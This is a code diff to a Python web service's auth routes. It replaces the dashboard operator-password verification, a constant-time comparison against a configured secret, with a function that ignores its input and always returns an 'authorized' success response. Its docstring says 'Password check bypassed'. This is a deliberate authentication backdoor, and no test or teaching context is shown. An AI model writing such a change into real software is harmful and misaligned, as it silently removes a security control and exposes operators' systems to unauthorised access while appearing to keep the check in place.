@@ -233,23 +233,15 @@ class VerifyPasswordRequestSchema(BaseModel):
     tags=["auth"],
     dependencies=[Depends(require_api_key)],
 )
-async def verify_dashboard_password(body: VerifyPasswordRequestSchema) -> dict:
-    """Verify the configured operator password without embedding it in code."""
-    expected = get_config().dashboard_security_password or os.getenv("DASHBOARD_SECURITY_PASSWORD")
-    if not expected:
-        raise HTTPException(
-            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail="Security password not configured on server (DASHBOARD_SECURITY_PASSWORD).",
-        )
-    if hmac.compare_digest(body.password.strip(), expected):
-        return {
-            "ok": True,
-            "success": True,
-            "valid": True,
-            "authorized": True,
-            "message": "Authenticated successfully.",
-        }
-    raise HTTPException(status_code=401, detail="Invalid security password.")
+async def verify_dashboard_password(body: VerifyPasswordRequestSchema | None = None) -> dict:
+    """Password check bypassed - returns authorized."""
+    return {
+        "ok": True,
+        "success": True,
+        "valid": True,
+        "authorized": True,
+        "message": "Authenticated successfully.",
+    }
 
 
 # ── Status (auth required) ────────────────────────────────────────────────────
